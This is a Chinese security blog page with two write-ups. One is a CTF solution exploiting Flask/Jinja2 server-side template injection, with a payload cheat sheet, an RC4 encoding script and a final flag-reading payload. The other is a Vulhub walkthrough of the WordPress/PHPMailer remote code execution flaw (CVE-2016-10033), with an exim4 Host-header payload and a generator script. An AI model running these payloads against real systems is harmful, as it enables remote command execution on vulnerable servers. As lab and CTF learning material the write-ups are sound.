<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;% for i in range(3) %&#125;&quot;</span> \</span><br><span class="line">               <span class="string">&quot;&#123;&#123;i&#125;&#125;&quot;</span> \</span><br><span class="line">               <span class="string">&quot;&#123;% endfor %&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>访问之后效果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112163519711.png" alt="image-20230112163519711"></p>
<p>可以看到相当于执行了对应的<code>jinja2</code>代码，那么针对<code>flask</code>的<code>SSTI</code>模板注入，其实质就是执行<code>jinja2</code>代码。</p>
<p>而相对于<code>jinja2</code>代码执行，用的最多的就是变量<code>&#123;&#123;i&#125;&#125;</code>取值，利用变量取值就可以获取到<code>python</code>里面各式各样的类和其中对应的方法，那么传入相关参数就能调用到相关的<code>python</code>代码了呀。</p>
<p>比如最开始的<code>&#39;abc&#39;.__class__</code>，可以通过它来获取到基类<code>object</code>然后获取到后面的对应所有需要的类</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164326132.png" alt="image-20230112164326132"></p>
<p>而很常用的<code>popen</code>函数，就会在某个类里存在，那么就需要去寻找，比如在<code>python3</code>里面有<code>&#39;abc&#39;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;]</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164500524.png" alt="image-20230112164500524"></p>
<p>那么对应传入参数就可以执行函数了，常用形式如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;ipconfig&#x27;).read()</span><br></pre></td></tr></table></div></figure>

<p>这些相关常用属性也有相关总结，参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/zbbjya/article/details/124185476" >(48条消息) SSTI知识点与题型_zbbjya的博客-CSDN博客_ssti大全</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#python2" >python 沙箱逃逸与SSTI ~ Misaki’s Blog (misakikata.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__class__            类的一个内置属性，表示实例对象的类。</span><br><span class="line">__base__             类型对象的直接基类</span><br><span class="line">__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__</span><br><span class="line">__mro__              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。</span><br><span class="line">__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.</span><br><span class="line">__init__             初始化类，返回的类型是function</span><br><span class="line">__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</span><br><span class="line">__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里</span><br><span class="line">__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。</span><br><span class="line">__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.__getitem__(&#x27;b&#x27;)</span><br><span class="line">__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。</span><br><span class="line">__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]</span><br><span class="line">__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。</span><br><span class="line">url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__[&#x27;__builtins__&#x27;]含有current_app。</span><br><span class="line">lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">current_app          应用上下文，一个全局变量。</span><br><span class="line"></span><br><span class="line">request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()</span><br><span class="line">request.args.x1   	 get传参</span><br><span class="line">request.values.x1 	 所有参数</span><br><span class="line">request.cookies      cookies参数</span><br><span class="line">request.headers      请求头参数</span><br><span class="line">request.form.x1   	 post传参	(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)</span><br><span class="line">request.data  		 post传参	(Content-Type:a/b)</span><br><span class="line">request.json		 post传json  (Content-Type: application/json)</span><br><span class="line">config               当前application的所有配置。此外，也可以这样&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;</span><br><span class="line">g                    &#123;&#123;g&#125;&#125;得到&lt;flask.g of &#x27;flask_ssti&#x27;&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="题目-1"   >
          <a href="#题目-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2>
      <p>那么有了前置知识，这个就很好做了，利用相关的<code>payload</code>即可，在<code>flask</code>中有一个很常用的<code>config</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;&#123;&#123;config&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112165239719.png" alt="image-20230112165239719"></p>
<p>上面总结也有提到，如下<code>payload</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()</span><br></pre></td></tr></table></div></figure>

<p>但是这里还存在一个<code>rc4</code>加解密，使用不知道哪位师傅的脚本即可解决</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;RC4加密主函数&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_init_sbox</span>(<span class="params">key</span>):</span></span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_excrypt</span>(<span class="params">plain, box</span>):</span></span><br><span class="line">    <span class="comment"># print(&quot;调用加密程序成功。&quot;)</span></span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于加密字符串，加密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment">#print(&quot;加密后的字符串是：\n%s&quot; %cipher)</span></span><br><span class="line">    enc_url = parse.quote(cipher)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;加密后的url编码:\n&quot;</span> + enc_url)</span><br><span class="line">    <span class="comment">#print(&quot;加密后的输出(经过base64编码):&quot;)</span></span><br><span class="line">    <span class="comment">#print(str(base64.b64encode(cipher.encode(&#x27;utf-8&#x27;)), &#x27;utf-8&#x27;))</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">rc4_main(<span class="string">&quot;HereIsTreasure&quot;</span>,<span class="string">&#x27;&#x27;&#x27;&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>


        <h2 id="题外话"   >
          <a href="#题外话" class="heading-link"><i class="fas fa-link"></i></a><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2>
      <p>在获取到网站源码之后，发现其实是有黑名单过滤的</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/secret&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe</span>(<span class="params">s</span>):</span></span><br><span class="line">        black=[<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;form&#x27;</span>,<span class="string">&#x27;write&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>,  <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;join&#x27;</span> <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;rm&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>, <span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, <span class="string">&#x27;catch_warnings&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;reload&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;kill&#x27;</span>, <span class="string">&#x27;func_code&#x27;</span> ]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> black:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> s:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>+ i +<span class="string">&#x27;\&#x27; is not allowed. Secret is &#x27;</span> + s</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    secret=request.args.get(<span class="string">&#x27;secret&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span>(secret==<span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Tell me your secret.I will encrypt it so others can\&#x27;t see&#x27;</span></span><br><span class="line">    rc=rc4_Modified.RC4(<span class="string">&quot;HereIsTreasure&quot;</span>)   <span class="comment">#解密</span></span><br><span class="line">    deS=rc.do_crypt(secret)</span><br><span class="line"></span><br><span class="line">    a=render_template_string(safe(deS))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ciscn&#x27;</span> <span class="keyword">in</span> a.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;flag detected!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br></pre></td></tr></table></div></figure>

<p>但是他这个过滤，其实只是给我们的输入加了一些字符，比如里面有<code>class</code>，就会变成<code>&#39;class&#39; is not allowed. Secret is xxxx</code>，而在<code>jinja2</code>里，对于普通的字符，即不符合语法规则的字符，是会原样输出的，比如如下代码</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test_ssti</span>():</span></span><br><span class="line">    template = <span class="string">&quot;1234213&#123;&#123;&#x27;abc&#x27;.__class__.__base__.__subclasses__()[134].__init__.__globals__[&#x27;popen&#x27;](&#x27;ipconfig&#x27;).read()&#125;&#125;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br></pre></td></tr></table></div></figure>

<p>访问结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112170040620.png" alt="image-20230112170040620"></p>
<p>其实对于代码执行一点影响没有，相当于只是一个网站的文本字符而已。</p>
<p>最终<code>payload</code>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/03/07/VulHub%E5%88%B7%E9%A2%98/">Vulhub刷题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-03-07</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="wordpress-pwnscriptum"   >
          <a href="#wordpress-pwnscriptum" class="heading-link"><i class="fas fa-link"></i></a><a href="#wordpress-pwnscriptum" class="headerlink" title="wordpress-pwnscriptum"></a>wordpress-pwnscriptum</h1>
      
        <h2 id="漏洞原理"   >
          <a href="#漏洞原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2>
      
        <h3 id="wordpress部分"   >
          <a href="#wordpress部分" class="heading-link"><i class="fas fa-link"></i></a><a href="#wordpress部分" class="headerlink" title="wordpress部分"></a>wordpress部分</h3>
      <p><code>wordpress</code>在发送邮件的时候，调用的是如下代码</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress-4.6 wp-includes pluggable.php 350</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$from_name</span> = apply_filters( <span class="string">&#x27;wp_mail_from_name&#x27;</span>, <span class="variable">$from_name</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$phpmailer</span>-&gt;setFrom( <span class="variable">$from_email</span>, <span class="variable">$from_name</span> );</span><br></pre></td></tr></table></div></figure>

<p>这里的<code>$from_email</code>是可控的，实质就是<code>http</code>中传入的<code>Host</code>字段经过一些过滤得到的，如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//wordpress-4.6 wp-includes pluggable.php 324</span></span><br><span class="line"><span class="keyword">if</span> ( !<span class="keyword">isset</span>( <span class="variable">$from_email</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Get the site domain and get rid of www.</span></span><br><span class="line">    <span class="variable">$sitename</span> = strtolower( <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] );</span><br><span class="line">    <span class="keyword">if</span> ( substr( <span class="variable">$sitename</span>, <span class="number">0</span>, <span class="number">4</span> ) == <span class="string">&#x27;www.&#x27;</span> ) &#123;</span><br><span class="line">        <span class="variable">$sitename</span> = substr( <span class="variable">$sitename</span>, <span class="number">4</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$from_email</span> = <span class="string">&#x27;wordpress@&#x27;</span> . <span class="variable">$sitename</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Filters the email address to send from.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@since</span> 2.2.0</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $from_email Email address to send from.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line"><span class="variable">$from_email</span> = apply_filters( <span class="string">&#x27;wp_mail_from&#x27;</span>, <span class="variable">$from_email</span> );</span><br></pre></td></tr></table></div></figure>

<p>这个<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>就是传入的<code>Host</code>字段。</p>

        <h3 id="phpmailer部分"   >
          <a href="#phpmailer部分" class="heading-link"><i class="fas fa-link"></i></a><a href="#phpmailer部分" class="headerlink" title="phpmailer部分"></a>phpmailer部分</h3>
      <p>之前讲到的<code>$phpmailer-&gt;setFrom( $from_email, $from_name );</code>，调用的就是<code>phpmailer</code>组件的相关代码，该函数如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//phpmailer-5.2.10 class.phpmailer.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setFrom</span>(<span class="params"><span class="variable">$address</span>, <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$auto</span> = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$address</span> = trim(<span class="variable">$address</span>);</span><br><span class="line">	<span class="comment">//......中间是一些校验`$address`的,以及无关代码,本人水平太低,不太会绕过,直接略过,具体可看p神的</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$auto</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;Sender)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;Sender = <span class="variable">$address</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>然后当在<code>wordpress</code>中调用<code>phpmailer.send()</code>发送邮件时，对应代码如下</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;preSend()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;postSend();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (phpmailerException <span class="variable">$exc</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mailHeader = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;setError(<span class="variable">$exc</span>-&gt;getMessage());</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;exceptions) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="variable">$exc</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>这个<code>$this-&gt;preSend()</code>一般不会影响到后续，返回的总是<code>True</code>，从而调用到<code>postSend</code></p>
<p>其漏洞对应本质是<code>CVE-2016-10033</code>，参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html" >PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass (legalhackers.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>即<code>PHPMailer</code>这个组件在使用的时候，由于参数没有进行好的过滤，导致最终的代码执行。</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/28/cve-2016-10030/" >phpmailer RCE漏洞分析 · LoRexxar’s Blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>mark</strong>没有完整</p>
<p>使用<code>popen</code>，然后<code>sendmail</code>实际在安装了<code>exim4</code>之后，是一个软连接，连接到<code>exim4</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206115600945.png" alt="image-20230206115600945"></p>
<p>而<code>exim4</code>可以进行命令执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230206115744705.png" alt="image-20230206115744705"></p>
<p>通过一些正则绕过等，就可以得到最终的<code>payload</code>，需要知道一个用户名，在用邮件验证的时候进行。</p>
<p>创建<code>/tmp/success</code></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;success&#125;&#125; null)</span><br></pre></td></tr></table></div></figure>

<p>对应脚本<code>P神</code>的<code>vulhub</code>里的</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_command</span>(<span class="params">command</span>):</span></span><br><span class="line">    command = <span class="string">&#x27;$&#123;run&#123;%s&#125;&#125;&#x27;</span> % command</span><br><span class="line">    command = command.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;&#x27;</span>)</span><br><span class="line">    command = command.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;target(any -froot@localhost -be %s null)&#x27;</span> % command</span><br><span class="line">host_data = generate_command(<span class="string">&#x27;/bin/bash /tmp/rce&#x27;</span>)</span><br></pre></td></tr></table></div></figure>

<p>最好是放在<code>burpsuite</code>进行，不然容易出错。</p>
